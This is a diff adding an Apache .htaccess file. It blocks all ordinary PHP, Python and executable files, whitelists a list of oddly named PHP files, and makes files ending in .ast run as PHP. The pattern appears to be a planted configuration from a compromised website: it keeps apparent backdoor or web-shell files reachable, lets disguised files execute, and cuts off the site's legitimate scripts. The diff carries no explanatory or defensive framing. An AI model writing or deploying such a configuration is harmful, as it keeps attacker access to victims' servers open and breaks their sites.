@@ -1,0 +1,10 @@
+<FilesMatch "\.(py|exe|php|phtml)$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+<FilesMatch "(fmg|.log|405|rud|ntsmk|classe-input|install|nginx_wp|cache|preload|timeout|update_failed|update_now|update_success|update_post|wpFastestCache)\.php$">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
+
+AddType application/x-httpd-php .ast
